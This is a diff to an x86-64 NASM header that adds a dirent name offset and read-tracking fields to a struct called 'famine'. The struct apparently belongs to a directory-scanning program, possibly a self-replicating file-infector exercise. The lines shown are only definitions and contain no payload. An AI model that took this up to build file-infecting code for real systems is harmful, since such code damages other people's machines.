@@ -16,6 +16,7 @@
 %define		D_OFF_OFF			0x08
 %define		D_RECLEN_OFF		0x10
 %define		D_TYPE  			0x12
+%define		D_NAME  			0x13
 %define     D_REG_FILE          0x8
 
 %define     PAGE_SIZE           0x1000
@@ -23,7 +24,10 @@
 %define		FAM(x)				[(rbp - famine_size) + x]
 
 struc famine
-    .dirents:       resb        PAGE_SIZE
+    .dirents:           resb    PAGE_SIZE
+    .total_read:        resd    1
+    .total_to_read:     resd    1
+    .dirents_struct_ptr resq    1
 endstruc
 
 %macro writeWork 0
